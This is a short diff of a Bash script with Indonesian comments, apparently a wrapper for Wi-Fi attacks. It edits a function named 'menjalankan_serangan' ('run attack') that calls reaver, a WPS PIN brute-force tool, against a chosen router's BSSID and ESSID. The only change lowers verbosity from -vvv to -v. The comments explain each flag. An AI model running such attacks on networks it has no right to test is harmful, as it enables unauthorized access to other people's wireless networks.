@@ -229,7 +229,7 @@ function mengatur_target(){
 function menjalankan_serangan(){
         waktu=$(date "+%d-%m-%Y_%H:%M:%S")
         sesi="${nama_folder}/${essid}_${waktu}.session"
-	reaver -i "${interface}" -c "${channel}" -b "${bssid}" -e "${essid}" -s "${sesi}" -vvv
+	reaver -i "${interface}" -c "${channel}" -b "${bssid}" -e "${essid}" -s "${sesi}" -v
         #
         # Keterangan:
 	#
@@ -238,7 +238,7 @@ function menjalankan_serangan(){
 	# -b   : Menentukan bssid (alamat MAC) dari router atau access point yang akan diserang.
         # -e   : Menentukan ESSID (nama jaringan Wi-Fi) dari jaringan yang akan diserang.
 	# -s   : Menentukan file sesi yang digunakan untuk menyimpan atau melanjutkan serangan.
-	# -vvv : Menambahkan tingkat verbositas (verbosity) untuk output yang lebih detail selama serangan.
+	# -v   : Menambahkan tingkat verbositas (verbosity) untuk output yang lebih detail selama serangan.
 }
 
 # Fungsi untuk menonaktifkan mode monitor pada interface yang sudah diatur.
